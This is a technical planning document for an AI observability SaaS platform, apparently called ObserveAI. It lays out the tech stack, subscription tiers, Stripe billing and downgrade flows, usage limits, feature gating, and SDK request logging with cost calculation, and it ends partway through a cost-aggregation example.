# 📘 **COMPLETE TECHNICAL PLANNING & ARCHITECTURE DOCUMENT**

## AI Observability Platform - Detailed System Design & Flow Specification

---

## 🎯 Phase 1 Feature Set (Expanded)

Based on your requirements, here's what we'll build:

### **Core Features:**

**1. Request Logging & Tracking** 📝

- Log every LLM API call
- Capture: prompt, response, model, timestamp
- Show conversation threads

**2. Cost Tracking** 💰

- Real-time cost calculation per request
- Daily/weekly/monthly totals
- Cost breakdown by:
    - User/session
    - Model used
    - Feature/endpoint

**3. Tool & API Call Tracking** 🔧

- Track which external APIs AI called
- Database queries made
- Function calls executed
- RAG document retrievals

**4. Error Detection** 🚨

- API failures
- Timeout errors
- Rate limit hits
- Invalid responses
- Empty/null responses

**5. Cost Optimization Suggestions** 💡

- Flag expensive requests
- Suggest cheaper models for simple tasks
- Identify repetitive prompts (caching opportunity)
- Show token waste (verbose prompts)

**6. Simple Dashboard** 📊

- Overview: requests, cost, errors (today)
- Request timeline
- Cost chart (last 7 days)
- Error list


# Tech Stack

# ✅ **Final Updated Tech Stack**

---

## 🎯 **Complete Tech Stack**

### **Frontend**

yaml

`Core:
  - React 18 + TypeScript
  - Vite (build tool)
  
Styling:
  - Tailwind CSS
  - shadcn/ui (component library)
  
State Management:
  - Zustand (global state)
  - TanStack Query / React Query (server state & caching)
  
Routing:
  - React Router v6
  
Charts:
  - Recharts
  
HTTP Client:
  - Axios
  
Form Handling:
  - React Hook Form (optional, for complex forms)
  - Zod (validation)`

### **Backend**

yaml

`Runtime:
  - Node.js (v18+)
  
Framework:
  - Express.js + TypeScript
  
Database:
  - PostgreSQL 15+
  - Prisma ORM
  
Authentication:
  - JWT (jsonwebtoken)
  - bcrypt (password hashing)
  
Validation:
  - Zod
  
Security:
  - helmet
  - cors
  
Environment:
  - dotenv`

### **Database**

yaml

`Database:
  - PostgreSQL 15+
  
ORM:
  - Prisma
  
Hosting Options:
  - Supabase (free tier, recommended)
  - Neon (free tier)
  - Railway (paid)`

### **SDK (Client Library)**

yaml

`Language:
  - TypeScript
  
Package Manager:
  - npm
  
Build:
  - tsup or rollup`

### **Deployment**

yaml

`Frontend:
  - Vercel (recommended)
  - Netlify
  
Backend:
  - Railway (recommended, easy PostgreSQL)
  - Render
  - Fly.io
  
Database:
  - Supabase (includes PostgreSQL)
  - Neon`

### **Dev Tools**

yaml

`Version Control:
  - Git + GitHub
  
Code Editor:
  - VS Code
  
API Testing:
  - Postman / Insomnia / Thunder Client
  
Database UI:
  - Prisma Studio (built-in)
  - pgAdmin (optional)`

# 📋 **Table of Contents**

1. [High-Level System Architecture]
2. [Subscription & Monetization Architecture]
3. [User Journey Flows (All Tiers)]
4. [Data Flow Architecture]
5. [Feature Implementation Specifications]
6. [Database Architecture & Relationships]
7. [Authentication & Authorization System]
8. [Payment Integration Architecture]
9. [Admin Panel Architecture]
10. [State Management Strategy]
11. [Error Handling & Edge Cases]
12. [Performance & Scalability Design]
13. [Security Architecture]
14. [Development Workflow]

---

# 1. High-Level System Architecture

## 1.1 System Overview Diagram

`┌─────────────────────────────────────────────────────────────────────┐
│                         COMPLETE ECOSYSTEM                          │
└─────────────────────────────────────────────────────────────────────┘

                    ┌──────────────────────┐
                    │   END USER (Dev)     │
                    │   Uses AI app        │
                    └──────────┬───────────┘
                               │
                               │ (1) Visits website
                               ↓
            ┌──────────────────────────────────────┐
            │     USER PLATFORM (observeai.com)    │
            ├──────────────────────────────────────┤
            │ PUBLIC SECTION:                      │
            │  • Landing Page                      │
            │  • Features Overview                 │
            │  • Pricing (4 tiers)                 │
            │  • Documentation                     │
            │  • Login/Register                    │
            │                                      │
            │ PRIVATE SECTION (After Login):       │
            │  • Dashboard (usage, stats)          │
            │  • Request Logs                      │
            │  • Cost Analytics                    │
            │  • Error Monitoring                  │
            │  • Optimization (STARTER+)           │
            │  • Settings & Billing                │
            │                                      │
            │ TIER-SPECIFIC FEATURES:              │
            │  ✓ Free: Basic features              │
            │  ✓ Starter: + Optimization           │
            │  ✓ Pro: + Advanced Analytics         │
            └──────────┬───────────────────────────┘
                       │
                       │ (2) Signs up
                       │ (3) Creates project
                       │ (4) Gets API key
                       ↓
            ┌──────────────────────────┐
            │  User installs SDK       │
            │  npm install observeai   │
            └──────────┬───────────────┘
                       │
                       │ (5) SDK integrated
                       ↓
            ┌──────────────────────────────────┐
            │   USER'S AI APPLICATION          │
            │   (Customer's Production App)    │
            │                                  │
            │   SDK wraps OpenAI/Anthropic     │
            │   Automatically logs requests    │
            └──────────┬───────────────────────┘
                       │
                       │ (6) HTTP POST (logs)
                       ↓
            ┌──────────────────────────────────────┐
            │        BACKEND API SERVER            │
            │      (api.observeai.com)             │
            ├──────────────────────────────────────┤
            │ ROUTING LAYER:                       │
            │  • /api/auth (register, login)       │
            │  • /api/projects (CRUD)              │
            │  • /api/requests (query logs)        │
            │  • /api/stats (analytics)            │
            │  • /api/sdk-log (receive from SDK)   │
            │  • /api/subscriptions (billing)      │
            │  • /api/admin/* (admin only)         │
            │  • /webhooks/stripe (payments)       │
            │                                      │
            │ MIDDLEWARE LAYER:                    │
            │  ① Auth Verification (JWT)           │
            │  ② Subscription Status Check         │
            │  ③ Usage Limit Enforcement           │
            │  ④ Feature Gate Checking             │
            │  ⑤ Rate Limiting                     │
            │                                      │
            │ BUSINESS LOGIC LAYER:                │
            │  • User Management                   │
            │  • Usage Tracking                    │
            │  • Cost Calculation                  │
            │  • Feature Access Control            │
            │  • Payment Processing                │
            └──────────┬───────────────────────────┘
                       │
                       │ (7) Database queries
                       ↓
            ┌──────────────────────────────────────┐
            │       DATABASE (PostgreSQL)          │
            ├──────────────────────────────────────┤
            │ TABLES:                              │
            │  • users                             │
            │    - subscription tier & status      │
            │    - usage counters                  │
            │    - stripe customer ID              │
            │                                      │
            │  • projects                          │
            │    - API keys                        │
            │    - active/inactive status          │
            │                                      │
            │  • requests                          │
            │    - full request logs               │
            │    - cost calculations               │
            │                                      │
            │  • tool_calls                        │
            │    - function/API tracking           │
            │                                      │
            │  • subscription_history              │
            │    - upgrade/downgrade events        │
            │                                      │
            │  • invoices                          │
            │    - payment records                 │
            └──────────┬───────────────────────────┘
                       │
                       ↕ (8) External integrations
            ┌──────────────────────────────────────┐
            │      STRIPE (Payment Processor)      │
            │                                      │
            │  • Manages subscriptions             │
            │  • Processes payments                │
            │  • Sends webhooks on events          │
            │  • Hosts billing portal              │
            └──────────────────────────────────────┘

            ┌──────────────────────────────────────┐
            │    ADMIN PANEL (admin.observeai.com) │
            │                                      │
            │  Admin (YOU) manages:                │
            │  • All users & subscriptions         │
            │  • Revenue analytics (MRR/ARR)       │
            │  • System health monitoring          │
            │  • User actions (ban, delete)        │
            │  • Payment failure handling          │
            └──────────────────────────────────────┘`

## 1.2 Component Interaction Pattern

`REQUEST FLOW PATTERN:
═══════════════════════════════════════════════════════════

USER ACTION → FRONTEND → API → MIDDLEWARE CHAIN → BUSINESS LOGIC → DATABASE
                                                                         ↓
USER SEES RESULT ← FRONTEND ← API ← RESPONSE FORMATTER ← DATA PROCESSED

MIDDLEWARE CHAIN (Every Request):
1. CORS Check (is origin allowed?)
2. Auth Check (is user logged in?)
3. Subscription Check (is subscription active?)
4. Usage Check (within limits?)
5. Feature Check (has access to this feature?)
6. Rate Limit Check (not abusing API?)

If ANY check fails → Return error, stop chain
If ALL pass → Continue to business logic`

## 1.3 Multi-Tenancy Pattern

`DATA ISOLATION STRATEGY:
═══════════════════════════════════════════════════════════

User A                  User B                  User C
  ↓                       ↓                       ↓
Projects A1, A2        Projects B1             Projects C1, C2, C3
  ↓                       ↓                       ↓
Requests for A1        Requests for B1         Requests for C1
Requests for A2                                Requests for C2
                                              Requests for C3

DATABASE QUERIES ALWAYS FILTERED BY USER:
- User can ONLY see their own projects
- Projects ONLY show requests belonging to them
- No cross-user data leakage
- Enforced at database query level (WHERE userId = ...)`

---

# 2. Subscription & Monetization Architecture

## 2.1 Subscription Tier Structure

`TIER HIERARCHY & FEATURE MATRIX:
═══════════════════════════════════════════════════════════

                    FREE    STARTER   PRO      ENTERPRISE
                    ────    ───────   ───      ──────────
Price               $0      $19/mo    $49/mo   Custom

LIMITS:
Requests/month      10K     100K      1M       Unlimited
Projects            1       5         ∞        ∞
Data retention      7d      30d       90d      Custom
Team members        1       3         10       ∞

CORE FEATURES:
Request logging     ✓       ✓         ✓        ✓
Cost tracking       ✓       ✓         ✓        ✓
Error monitoring    ✓       ✓         ✓        ✓
Dashboard           ✓       ✓         ✓        ✓

PAID FEATURES:
Cost optimization   ✗       ✓         ✓        ✓
Tool tracking       ✗       ✓         ✓        ✓
Export CSV          ✗       ✓         ✓        ✓
Custom date ranges  ✗       ✓         ✓        ✓

PREMIUM FEATURES:
Advanced analytics  ✗       ✗         ✓        ✓
API access          ✗       ✗         ✓        ✓
Webhooks            ✗       ✗         ✓        ✓
Team collaboration  ✗       ✗         ✓        ✓

ENTERPRISE ONLY:
SSO/SAML            ✗       ✗         ✗        ✓
Dedicated support   ✗       ✗         ✗        ✓
SLA guarantee       ✗       ✗         ✗        ✓
On-premise option   ✗       ✗         ✗        ✓`

## 2.2 Subscription State Machine

`SUBSCRIPTION STATUS FLOW:
═══════════════════════════════════════════════════════════

[User Signs Up]
      ↓
   [FREE] (active) ←──────────────────┐
      │                               │
      │ User clicks "Upgrade"         │ Subscription cancelled
      ↓                               │ or payment fails for 7 days
[Create Stripe Session]               │
      ↓                               │
[User enters payment]                 │
      ↓                               │
   Success? ─No→ [Abort, stay FREE]   │
      │                               │
     Yes                              │
      ↓                               │
[STARTER/PRO] (active) ────────────────┘
      │
      │ Monthly renewal date arrives
      ↓
[Stripe attempts charge]
      ↓
   Success? ─Yes→ [Stay active, send invoice]
      │
     No
      ↓
[past_due] ← Grace period (7 days)
      │
      │ User updates payment?
      ├─Yes→ [Return to active]
      │
     No (7 days passed)
      ↓
[Downgrade to FREE]
  • Cancel Stripe subscription
  • Reduce limits
  • Disable extra projects
  • Delete old data

DOWNGRADE SCHEDULING:
═══════════════════════════════════════════════════════════

User on STARTER clicks "Downgrade to FREE"
      ↓
[Confirmation Modal]
  "You will lose:
   - 4 projects (keep only 1)
   - Cost optimization feature
   - Data older than 7 days
   
   Downgrade takes effect: March 1"
      ↓
User confirms
      ↓
[Set pendingDowngrade = true]
[Set downgradeDate = next billing date]
      ↓
User keeps STARTER features until March 1
      ↓
March 1 arrives (automated job runs)
      ↓
[Execute downgrade]
  • Update tier to FREE
  • Disable 4 projects (user chose which to keep)
  • Delete requests older than 7 days
  • Reset limits
  • Send confirmation email`

## 2.3 Usage Tracking System

`USAGE COUNTER ARCHITECTURE:
═══════════════════════════════════════════════════════════

User Record in Database:
{
  id: "user_123",
  subscriptionTier: "FREE",
  monthlyRequestCount: 8,456,
  monthlyRequestLimit: 10,000,
  requestResetDate: "2024-03-01T00:00:00Z"
}

SDK SENDS REQUEST:
      ↓
[Backend receives at /api/sdk-log]
      ↓
MIDDLEWARE: Check current date vs resetDate
      ↓
   Is today >= resetDate?
      │
     Yes → Reset counter to 0, set new resetDate
      │
     No → Continue
      ↓
MIDDLEWARE: Check usage
      ↓
   monthlyRequestCount >= monthlyRequestLimit?
      │
     Yes → Return 429 error (limit exceeded)
      │     Don't log request
      │     SDK handles gracefully
      │
     No → Continue
      ↓
INCREMENT COUNTER:
   UPDATE users 
   SET monthlyRequestCount = monthlyRequestCount + 1
   WHERE id = 'user_123'
      ↓
LOG REQUEST TO DATABASE
      ↓
Return success to SDK

RESET MECHANISM (Automated Daily Job at 00:00 UTC):
═══════════════════════════════════════════════════════════

For each user:
  If requestResetDate <= today:
    • Set monthlyRequestCount = 0
    • Set requestResetDate = first day of next month
    • Send "your limit has reset" email (if they were near/at limit)`

## 2.4 Feature Gating System

`FEATURE ACCESS CONTROL PATTERN:
═══════════════════════════════════════════════════════════

FEATURE MATRIX (Stored in Backend):
{
  'request_logging': ['FREE', 'STARTER', 'PRO', 'ENTERPRISE'],
  'cost_optimization': ['STARTER', 'PRO', 'ENTERPRISE'],
  'advanced_analytics': ['PRO', 'ENTERPRISE'],
  'sso': ['ENTERPRISE']
}

USER REQUESTS FEATURE:
      ↓
[Frontend checks if feature is locked]
      ↓
   Locked? → Show "Upgrade" prompt, block action
      │
     Not locked
      ↓
[Make API request]
      ↓
[Backend middleware: requireFeature('cost_optimization')]
      ↓
   User tier in allowed list?
      │
     No → Return 403 Forbidden
          {
            error: "FEATURE_LOCKED",
            requiredPlan: "STARTER",
            upgradeUrl: "/upgrade"
          }
      │
     Yes → Continue to endpoint logic

FRONTEND GATING (UI Level):
═══════════════════════════════════════════════════════════

Navigation Sidebar:
  Dashboard           → Always visible
  Requests            → Always visible
  Cost Tracking       → Always visible
  Optimization        → Shows "🔒 STARTER" badge if FREE user
                      → Clicking opens upgrade modal instead of page

Page Level:
  If user tries to access /optimization directly:
    • Check their tier
    • If FREE → Show locked screen with upgrade CTA
    • If STARTER+ → Show actual feature

BACKEND GATING (API Level):
═══════════════════════════════════════════════════════════

Route Definition:
  GET /api/optimization
    ↓
  Middleware: authenticate (check logged in)
    ↓
  Middleware: requireFeature('cost_optimization')
    ↓
  Controller: getOptimizationSuggestions()

This prevents ANY API access even if user bypasses frontend`

---

# 3. User Journey Flows (All Tiers)

## 3.1 Free User Complete Journey

`DAY 1: DISCOVERY & SIGNUP
═══════════════════════════════════════════════════════════

User searches "AI cost tracking tool"
      ↓
Lands on observeai.com
      ↓
[LANDING PAGE]
  • Hero: "See what your AI is doing in real-time"
  • Problem: "AI costs are unpredictable and hard to debug"
  • Solution: Screenshots of dashboard
  • Pricing preview
  • Big "Start Free" CTA
      ↓
User clicks "Start Free"
      ↓
[REGISTRATION PAGE]
  Form:
    Email: _______________
    Password: _______________
    Name (optional): _______________
    [✓] I agree to Terms
    
    [Create Account]
      ↓
Backend creates user:
  • subscriptionTier: FREE
  • subscriptionStatus: active
  • monthlyRequestLimit: 10,000
  • monthlyRequestCount: 0
  • projectLimit: 1
      ↓
Returns JWT token
      ↓
Frontend stores token, redirects to /dashboard

DAY 1: FIRST PROJECT SETUP
═══════════════════════════════════════════════════════════

[DASHBOARD - Empty State]
  
  Welcome, John! 🎉
  
  You're on the FREE plan
  [10,000 requests/month | 1 project | 7-day logs]
  
  Get started:
  
  1️⃣ Create your first project
     [Create Project]
  
  2️⃣ Install SDK (shown after project created)
  
  3️⃣ Start monitoring
      ↓
User clicks "Create Project"
      ↓
[Modal]
  Project Name: [My Chatbot_______]
  
  [Create] [Cancel]
      ↓
Backend checks:
  • Current project count: 0
  • Project limit: 1
  • 0 < 1 → ✓ Allowed
      ↓
Creates project, generates API key: obs_abc123xyz
      ↓
[Success Modal]
  ✓ Project created!
  
  Your API Key (keep secret):
  [obs_abc123xyz...] [Copy]
  
  Quick Install:`

npm install observeai-sdk

  
  `Add to your code:
```javascript
  import { ObserveAI } from 'observeai-sdk';
  const observed = ObserveAI.wrap(openai, {
    apiKey: 'obs_abc123xyz...'
  });
```
  
  [Documentation] [I'm Done]
      ↓
User integrates SDK in their AI app

DAY 1: FIRST REQUEST LOGGED
═══════════════════════════════════════════════════════════

User's app makes AI call via SDK
      ↓
SDK intercepts, sends to backend
      ↓
Backend receives at POST /api/sdk-log
      ↓
VALIDATION CHAIN:
  ✓ API key valid?
  ✓ Project exists?
  ✓ User not banned?
  ✓ Subscription active?
  ✓ Within usage limit? (0 < 10,000 ✓)
      ↓
Increment counter: 0 → 1
      ↓
Store request in database
      ↓
Return success to SDK
      ↓
User refreshes dashboard
      ↓
[DASHBOARD - With Data]
  
  FREE Plan
  Usage: 1 / 10,000 requests
  [Upgrade]
  
  📊 Stats:
    Requests today: 1
    Cost today: $0.03
    Errors: 0
  
  [Request Timeline Chart]
    • Shows 1 data point
  
  [Recent Requests]
    Time        Model    Cost     Status
    2 min ago   gpt-4    $0.03    ✓
    [View Details]
  
  🔒 LOCKED FEATURES:
    
    [Cost Optimization] 🔒
    "Upgrade to STARTER to see savings suggestions"
    [Upgrade Now]
    
    [Tool Tracking] 🔒
    "Track which APIs your AI calls"
    [Upgrade Now]

WEEK 2: EXPLORING & HITTING LIMITS
═══════════════════════════════════════════════════════════

User has made 9,500 requests (95% of limit)
      ↓
[WARNING BANNER appears on dashboard]
  ⚠️ You've used 9,500 / 10,000 requests (95%)
     
     Upgrade now to avoid service interruption
     [Upgrade to STARTER]
      ↓
Email sent:
  Subject: You're approaching your request limit
  
  You've used 95% of your FREE plan.
  Upgrade to STARTER for 100K requests/month.
  
  [Upgrade Now]
      ↓
User makes request #10,001
      ↓
Backend middleware:
  monthlyRequestCount (10,000) >= limit (10,000)?
  → YES
      ↓
Return 429 error to SDK:
  {
    error: "LIMIT_EXCEEDED",
    message: "Monthly limit reached",
    currentUsage: 10,000,
    limit: 10,000,
    upgradeUrl: "https://observeai.com/upgrade"
  }
      ↓
SDK logs warning but doesn't break user's app
      ↓
Dashboard shows:
  🚨 LIMIT REACHED
     
     Your requests are no longer being logged.
     
     Options:
     • Upgrade now → [Upgrade]
     • Wait until March 1 (limit resets)

WEEK 2: UPGRADE DECISION
═══════════════════════════════════════════════════════════

User clicks "Upgrade"
      ↓
[UPGRADE PAGE]
  
  Choose Your Plan:
  
  [FREE]           [STARTER]         [PRO]
  Current          $19/month         $49/month
  
  10K/mo           100K/mo           1M/mo
  1 project        5 projects        ∞ projects
  Basic            + Optimization    + Advanced
  
                   [Select]          [Select]
      ↓
User selects STARTER
      ↓
Frontend calls: POST /api/subscriptions/create-checkout
  Body: { planId: 'STARTER' }
      ↓
Backend creates Stripe Checkout Session
      ↓
Redirects to Stripe hosted page
      ↓
User enters card: 4242 4242 4242 4242
      ↓
Stripe processes payment ($19)
      ↓
Stripe sends webhook: checkout.session.completed
      ↓
Backend webhook handler:
  • Updates user:
    - subscriptionTier: STARTER
    - subscriptionStatus: active
    - monthlyRequestLimit: 100,000
    - projectLimit: 5
    - stripeCustomerId: cus_abc
    - stripeSubscriptionId: sub_xyz
  • Logs event in subscription_history
  • Sends confirmation email
      ↓
Stripe redirects to: /upgrade/success
      ↓
[SUCCESS PAGE]
  🎉 Welcome to STARTER!
  
  You now have:
  ✓ 100,000 requests/month
  ✓ 5 projects
  ✓ Cost optimization
  ✓ Tool tracking
  
  [Go to Dashboard]
      ↓
Dashboard now shows unlocked features`

## 3.2 Paid User Downgrade Flow

`DOWNGRADE SCENARIO: STARTER → FREE
═══════════════════════════════════════════════════════════

User has STARTER plan
Current usage:
  • 3 active projects
  • 45,000 requests this month
  • Been paying $19/mo for 3 months
      ↓
User clicks "Manage Subscription"
      ↓
[SUBSCRIPTION SETTINGS]
  
  Current Plan: STARTER
  $19/month
  
  Next billing: March 1, 2024
  
  [Change Plan] [Cancel Subscription]
      ↓
User clicks "Change Plan"
      ↓
[PLAN SELECTION MODAL]
  
  [FREE]           [STARTER]         [PRO]
  $0               Current Plan      $49/month
  
  [Select]         [Current]         [Upgrade]
      ↓
User selects FREE
      ↓
[CONFIRMATION MODAL - Critical Info]
  
  ⚠️ Downgrade to FREE Plan
  
  You currently have:
  • 3 projects (FREE allows 1)
  • 45,000 requests logged
  • Cost optimization access
  
  What will happen:
  ❌ You must choose 1 project to keep
  ❌ Other 2 projects will be disabled
  ❌ Data older than 7 days will be deleted
  ❌ Cost optimization will be locked
  ❌ Tool tracking will be locked
  
  When:
  • Downgrade happens on March 1 (next billing date)
  • You keep STARTER features until then
  • Final charge: $19 on March 1
  
  [Cancel] [Confirm Downgrade]
      ↓
User clicks "Confirm Downgrade"
      ↓
[PROJECT SELECTION]
  
  Choose 1 project to keep:
  
  ( ) My Chatbot (12K requests)
  (•) Production API (30K requests) ← Selected
  ( ) Test Project (3K requests)
  
  The other 2 will be disabled (you can reactivate by upgrading)
  
  [Back] [Continue]
      ↓
Backend:
  • Cancels Stripe subscription (at period end)
  • Updates user:
    - pendingDowngrade: true
    - downgradeDate: '2024-03-01'
    - downgradeTo: 'FREE'
    - projectToKeep: 'Production API'
  • Logs in subscription_history
      ↓
[CONFIRMATION]
  ✓ Downgrade scheduled
  
  Your plan will change on March 1
  
  Until then, you keep all STARTER features
  
  [Cancel Downgrade Anytime]
      ↓
Dashboard shows banner until March 1:
  ℹ️ Downgrade scheduled for March 1
     [Cancel Downgrade] [Keep STARTER]
      ↓
      
MARCH 1 - AUTOMATED DOWNGRADE:
═══════════════════════════════════════════════════════════

Scheduled job runs at 00:00 UTC
      ↓
Find all users with pendingDowngrade = true AND downgradeDate <= today
      ↓
For each user:
  1. Update subscription:
     - subscriptionTier: FREE
     - subscriptionStatus: active
     - monthlyRequestLimit: 10,000
     - monthlyRequestCount: 0 (reset for new month)
     - projectLimit: 1
     - pendingDowngrade: false
  
  2. Disable extra projects:
     - Mark 2 projects as isActive: false
  
  3. Delete old data:
     - DELETE requests WHERE timestamp < (NOW - 7 days)
     - DELETE tool_calls for those requests
  
  4. Send email:
     "Your plan has changed to FREE"
     
  5. Log event in subscription_history
      ↓
User logs in after March 1
      ↓
[DASHBOARD - Downgraded]
  
  FREE Plan
  Usage: 0 / 10,000 requests
  
  ℹ️ You have 2 disabled projects
     
     Upgrade to STARTER to reactivate:
     • My Chatbot
     • Test Project
     
     [Upgrade]
  
  Current active project: Production API`

## 3.3 Payment Failure Recovery Flow

`PAYMENT FAILURE SCENARIO
═══════════════════════════════════════════════════════════

User on STARTER plan
Monthly renewal date: March 1
      ↓
Stripe attempts to charge $19
      ↓
Card declined (insufficient funds / expired)
      ↓
Stripe sends webhook: invoice.payment_failed
      ↓
Backend webhook handler:
  • Updates user:
    - subscriptionStatus: 'past_due'
    - paymentFailedAt: (timestamp)
  • Logs event
  • Sends URGENT email
      ↓
[EMAIL]
  Subject: ⚠️ Payment failed - Update your card
  
  We couldn't charge your card for $19.
  
  Reason: Card declined
  
  Action needed:
  Update your payment method within 7 days to keep STARTER features.
  
  [Update Payment Method]
      ↓
User logs into dashboard
      ↓
[CRITICAL BANNER]
  🚨 Payment failed
     
     We couldn't process your payment ($19).
     
     Update your card within 7 days.
     Days remaining: 6
     
     [Update Payment] [Contact Support]
      ↓
User can still use STARTER features (grace period)
      ↓

PATH A: User updates payment
═══════════════════════════════════════════════════════════

User clicks "Update Payment"
      ↓
Frontend calls: POST /api/subscriptions/create-portal
      ↓
Backend creates Stripe Customer Portal session
      ↓
Redirects to Stripe portal
      ↓
[STRIPE PORTAL]
  Payment Methods
  
  Current: •••• 4242 (declined)
  
  [Add Payment Method]
      ↓
User adds new card
      ↓
Stripe automatically retries payment
      ↓
Payment succeeds
      ↓
Stripe sends webhook: invoice.payment_succeeded
      ↓
Backend:
  • Updates user:
    - subscriptionStatus: 'active'
    - paymentFailedAt: null
  • Creates invoice record
  • Sends confirmation email
      ↓
Dashboard banner removed ✓

PATH B: User doesn't update (7 days pass)
═══════════════════════════════════════════════════════════

Daily job checks past_due subscriptions
      ↓
If paymentFailedAt > 7 days ago:
  • Cancel Stripe subscription
  • Downgrade user to FREE (same process as voluntary downgrade)
  • Send "Your plan was downgraded" email
      ↓
User loses STARTER features`

## 3.4 Monthly Limit Reset Flow

`AUTOMATED MONTHLY RESET
═══════════════════════════════════════════════════════════

Scheduled Job: Runs daily at 00:00 UTC on 1st of month
      ↓
SELECT all users
      ↓
For each user:
  
  UPDATE users SET
    monthlyRequestCount = 0,
    requestResetDate = (first day of next month)
  WHERE id = user.id
      ↓
If user was at/near limit last month:
  Send email:
    Subject: Your request limit has reset
    
    Good news! You now have {limit} requests available.
    Last month you used {previousCount} requests.
      ↓
User sees dashboard:
  Usage: 0 / 10,000 requests ✨ Reset!
  Next reset: April 1`

---

# 4. Data Flow Architecture

## 4.1 Request Logging Flow (End-to-End)

`COMPLETE REQUEST JOURNEY
═══════════════════════════════════════════════════════════

┌─────────────────────────────────────┐
│   USER'S AI APP (Production)        │
│                                     │
│   const response = await observed   │
│     .chat.completions.create({      │
│       model: 'gpt-4',               │
│       messages: [...]               │
│     });                             │
└─────────────────┬───────────────────┘
                  │
                  │ (1) SDK intercepts
                  ↓
┌─────────────────────────────────────┐
│   SDK (observeai-sdk)               │
│                                     │
│   STEP 1: Record start time         │
│   STEP 2: Forward to OpenAI         │
│   STEP 3: Wait for response         │
│   STEP 4: Record end time           │
│   STEP 5: Calculate metrics:        │
│     • Latency = end - start         │
│     • Tokens from response          │
│     • Cost = calculate based on     │
│       model pricing                 │
│   STEP 6: Prepare log:              │
│     {                               │
│       timestamp,                    │
│       provider: 'openai',           │
│       model: 'gpt-4',               │
│       promptTokens: 145,            │
│       completionTokens: 89,         │
│       totalCost: 0.0567,            │
│       latencyMs: 1245,              │
│       status: 'success',            │
│       prompt: '...',                │
│       response: '...',              │
│       toolCalls: [...]              │
│     }                               │
│   STEP 7: Add to batch queue        │
│   STEP 8: Return response to app   │
└─────────────────┬───────────────────┘
                  │
                  │ (2) Batched HTTP POST
                  │     (every 5 seconds or 10 items)
                  ↓
┌─────────────────────────────────────┐
│   BACKEND API                       │
│   POST /api/sdk-log                 │
│                                     │
│   Headers:                          │
│     X-API-Key: obs_abc123xyz        │
│                                     │
│   Body: [array of log entries]     │
└─────────────────┬───────────────────┘
                  │
                  │ (3) Middleware chain
                  ↓
┌─────────────────────────────────────┐
│   MIDDLEWARE 1: Validate API Key    │
│                                     │
│   Query: SELECT * FROM projects     │
│          WHERE apiKey = 'obs_...'   │
│          INCLUDE user               │
│                                     │
│   Found? → Attach project & user    │
│   Not found? → 401 Unauthorized     │
└─────────────────┬───────────────────┘
                  │
                  ↓
┌─────────────────────────────────────┐
│   MIDDLEWARE 2: Check User Status   │
│                                     │
│   Is user.isBanned?                 │
│     Yes → 403 Forbidden             │
│   Is user.subscriptionStatus        │
│      != 'active'?                   │
│     Yes → 402 Payment Required      │
│   Otherwise → Continue              │
└─────────────────┬───────────────────┘
                  │
                  ↓
┌─────────────────────────────────────┐
│   MIDDLEWARE 3: Usage Limit Check   │
│                                     │
│   Check if need to reset:           │
│     today >= user.requestResetDate? │
│       Yes → Reset count to 0        │
│                                     │
│   Check limit:                      │
│     user.monthlyRequestCount        │
│       >= user.monthlyRequestLimit?  │
│       Yes → 429 Too Many Requests   │
│             Return error to SDK     │
│             {                       │
│               error: "LIMIT_EXCEEDED"│
│               usage: {...}          │
│               upgradeUrl: "..."     │
│             }                       │
│                                     │
│   Increment counter:                │
│     UPDATE users SET                │
│       monthlyRequestCount + 1       │
│     WHERE id = user.id              │
│                                     │
│   Continue → ✓                      │
└─────────────────┬───────────────────┘
                  │
                  ↓
┌─────────────────────────────────────┐
│   CONTROLLER: Store Requests        │
│                                     │
│   For each log entry in batch:      │
│                                     │
│   1. Validate schema (Zod)          │
│                                     │
│   2. INSERT INTO requests           │
│      (                              │
│        projectId,                   │
│        timestamp,                   │
│        provider,                    │
│        model,                       │
│        promptTokens,                │
│        completionTokens,            │
│        totalCost,                   │
│        latencyMs,                   │
│        status,                      │
│        prompt,                      │
│        response,                    │
│        ...metadata                  │
│      )                              │
│                                     │
│   3. If toolCalls exist:            │
│      INSERT INTO tool_calls         │
│      (requestId, toolName, ...)     │
│                                     │
│   4. Return success                 │
└─────────────────┬───────────────────┘
                  │
                  │ (4) Response
                  ↓
┌─────────────────────────────────────┐
│   SDK receives 200 OK               │
│   {                                 │
│     success: true,                  │
│     message: "Logged 5 requests"    │
│   }                                 │
│                                     │
│   SDK removes from queue ✓          │
│                                     │
│   If error (network failure):       │
│     Keep in queue, retry later      │
└─────────────────────────────────────┘

PARALLEL FLOW: User Views Dashboard
═══════════════════════════════════════════════════════════

User refreshes dashboard
      ↓
Frontend: GET /api/requests?projectId=proj_123&limit=50
      ↓
Backend:
  Middleware: Authenticate (JWT)
    ↓
  Query:
    SELECT * FROM requests
    WHERE projectId = 'proj_123'
    AND project.userId = (authenticated user)
    ORDER BY timestamp DESC
    LIMIT 50
    ↓
  Return results
      ↓
Frontend updates table with new data
      ↓
User sees their logged request! ✓

REAL-TIME UPDATES (Polling Strategy):
═══════════════════════════════════════════════════════════

Dashboard uses React Query with:
  refetchInterval: 30000  (30 seconds)
  
Every 30 seconds:
  • Automatically refetch stats
  • Update charts
  • Refresh request list
  
User sees near-real-time updates without manual refresh`

## 4.2 Cost Calculation Flow

`COST CALCULATION ARCHITECTURE
═══════════════════════════════════════════════════════════

PRICING DATABASE (Stored in Backend):
{
  'gpt-4': {
    promptCost: 0.03,      // per 1K tokens
    completionCost: 0.06    // per 1K tokens
  },
  'gpt-4-turbo': {
    promptCost: 0.01,
    completionCost: 0.03
  },
  'gpt-3.5-turbo': {
    promptCost: 0.0005,
    completionCost: 0.0015
  },
  'claude-3-opus': {
    promptCost: 0.015,
    completionCost: 0.075
  },
  'claude-3-sonnet': {
    promptCost: 0.003,
    completionCost: 0.015
  }
}

CALCULATION PROCESS:
═══════════════════════════════════════════════════════════

SDK receives OpenAI response:
  {
    usage: {
      prompt_tokens: 145,
      completion_tokens: 89
    }
  }
      ↓
SDK looks up pricing for model 'gpt-4'
      ↓
Calculate:
  promptCost = (145 / 1000) * 0.03 = $0.00435
  completionCost = (89 / 1000) * 0.06 = $0.00534
  totalCost = $0.00435 + $0.00534 = $0.00969
      ↓
Round to 4 decimal places: $0.0097
      ↓
Include in log data sent to backend
      ↓
Backend stores in requests.totalCost (DECIMAL(10,6))

AGGREGATION QUERIES:
═══════════════════════════════════════════════════════════

Total cost for project:
  SELECT SUM(totalCost) FROM requests
  WHERE projectId = 'proj_123'
  Result: $567.89

Cost by model:
  SELECT 
    model,
    COUNT(*) as request_count,
    SUM(totalCost) as total_cost
  FROM requests
  WHERE projectId = 'proj_123'
  GROUP BY model
  
  Result:
    gpt-4:          450 requests,  $312.45
